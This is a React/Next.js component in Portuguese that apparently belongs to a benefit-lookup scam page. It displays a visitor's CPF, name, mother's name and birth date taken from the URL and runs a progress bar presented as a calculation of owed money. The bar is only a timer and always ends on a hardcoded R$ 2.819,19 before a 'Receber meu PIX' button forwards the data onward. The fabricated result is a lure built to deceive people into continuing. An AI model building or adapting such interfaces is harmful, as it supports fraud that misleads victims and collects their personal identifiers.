'use client'
import { Button } from "@/components/ui/button";
import { useEffect, useState } from "react";
import { Progress } from "@/components/ui/progress";
import { useRouter, useSearchParams } from "next/navigation";

export function Dados() {

  const params = useSearchParams()
  const router = useRouter()

  const [document] = useState<string>(params.get('document') ?? '')
  const [name] = useState<string>(params.get('name') ?? '')
  const [mae] = useState<string>(params.get('mae') ?? '')
  const [nasc] = useState<string>(params.get('nasc') ?? '')


  const [visible, setVisible] = useState(false)

  const [value, setValue] = useState(0)

  useEffect(() => {
    if (value === 100) {
      setVisible(true)
    }
    if (value < 100) {
      const interval = setInterval(() => {
        setValue((prev) => Math.min(prev + 1, 100))
      }, 40)
      return () => clearInterval(interval)
    }
  }, [value])


  return (
    <div className="space-y-10">
      <div className="space-y-4">
        <div className="text-sm text-center">
          Atenção, o cálculo dos valores está sendo realizado, isso pode levar alguns minutos!
        </div>
        <Progress className="h-4" value={value} />
        <p className="text-sm font-medium">Dados verificados com sucesso!</p>
        <div className="flex flex-col gap-2">

          <p className="text-sm truncate max-w-[300px]">
            <strong> CPF :</strong> {" "}{document}
          </p>

          <p className="text-sm truncate max-w-[300px]">
            <strong> Nome :</strong> {" "}{name}
          </p>

          <p className="text-sm truncate max-w-[300px]">
            <strong> Nome da mãe :</strong> {" "}{mae}
          </p>

          <p className="text-sm truncate max-w-[300px]">
            <strong> Data de nascimento :</strong> {" "}{nasc}
          </p>
          <p className="text-sm truncate max-w-[300px]">
            <strong> Valor R$ :</strong> {" "}

            {
              !visible ? (<span className="animate-pulse">Verificando...</span>) : (
                <span>R$ 2.819,19</span>
              )
            }

          </p>

        </div>
      </div>
      {visible && (
        <div className="flex items-center gap-4 w-full">
          <Button onClick={() => router.push(`/app/onbording?document=${document}&name=${name}`)} className="w-full bg-[#216b16] hover:bg-[#216b16]">
            Receber meu PIX
          </Button>
        </div>
      )}
    </div>

  )
}